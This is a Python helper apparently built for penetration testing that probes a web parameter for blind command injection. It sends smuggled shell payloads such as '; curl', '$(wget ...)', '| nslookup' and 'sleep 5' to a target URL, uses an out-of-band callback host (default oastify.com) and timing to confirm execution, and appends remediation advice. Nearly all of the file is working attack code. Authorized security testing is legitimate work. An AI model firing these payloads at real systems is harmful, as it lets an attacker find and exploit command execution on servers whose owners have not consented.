"""Command injection OAST helper — blind CMD + OOB callback correlation."""
import json
import urllib.request
import urllib.parse
import random
import string
import time
import socket

def cmd_oast_helper(target: str, param: str = "cmd", method: str = "get", test_type: str = "oob", oob_domain: str = "", callback_server: str = "") -> str:
    if not target.startswith("http"):
        target = "http://" + target

    cb_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    oob = oob_domain or "oastify.com"
    callback_url = callback_server or f"http://{cb_id}.{oob}/"

    result = {
        "target": target,
        "param": param,
        "test_type": test_type,
        "callback_id": cb_id,
        "payloads_tested": [],
        "verified": False,
    }

    if test_type in ("oob", "both"):
        oob_payloads = [
            f"; curl {cb_id}.{oob}",
            f"| nslookup {cb_id}.{oob}",
            f"`curl {cb_id}.{oob}`",
            f"$(wget {cb_id}.{oob})",
            f"; ping -c 1 {cb_id}.{oob}",
            f"& ping -n 1 {cb_id}.{oob} &",
            f"| ping -c 1 {cb_id}.{oob}",
            f"; curl {callback_url}",
        ]
        for payload in oob_payloads:
            finding = _send_payload(target, param, payload, method)
            finding["callback_url"] = callback_url
            finding["oob_domain"] = f"{cb_id}.{oob}"
            result["payloads_tested"].append(finding)

    if test_type in ("time", "both"):
        time_payloads = [
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "& ping -n 5 127.0.0.1 &",
        ]
        for payload in time_payloads:
            t0 = time.time()
            finding = _send_payload(target, param, payload, method, timeout=12)
            elapsed = time.time() - t0
            finding["elapsed"] = round(elapsed, 2)
            finding["delayed"] = elapsed > 4
            if finding["delayed"]:
                finding["evidence"] = f"Response delayed {elapsed:.1f}s — blind CMD confirmed"
                result["verified"] = True
            result["payloads_tested"].append(finding)

    result["check_oob"] = f"Check callback {cb_id}.{oob} for DNS/HTTP interactions"
    result["total_payloads"] = len(result["payloads_tested"])
    result["exploitable"] = result["verified"]
    result["remediation"] = "Never pass user input to shell execution functions. Use language-native APIs. Validate input strictly with allowlists. Disable dangerous PHP functions (exec, system, shell_exec, passthru)."

    return json.dumps(result, indent=2)


def _send_payload(target, param, payload, method, timeout=10):
    p = param or "cmd"
    finding = {"payload": payload, "method": method, "verified": False}

    try:
        if method == "get":
            url = f"{target}?{urllib.parse.urlencode({p: payload})}"
            data = None
        else:
            url = target
            data = urllib.parse.urlencode({p: payload}).encode()

        req = urllib.request.Request(url, data=data, headers={"User-Agent": "CybersecCMDOAST/1.0"})
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="ignore").lower()

        if "uid=" in body or "gid=" in body or "www-data" in body or "root:" in body[:200]:
            finding["verified"] = True
            finding["evidence"] = "Command output in response"
        finding["status"] = resp.status
        finding["body_size"] = len(body)
    except urllib.error.HTTPError as e:
        finding["status"] = e.code
        body = e.read().decode("utf-8", errors="ignore").lower()[:200]
        if "uid=" in body or "gid=" in body or "root" in body:
            finding["verified"] = True
            finding["evidence"] = f"Command output in error {e.code}"
    except Exception as e:
        finding["error"] = str(e)[:100]

    return finding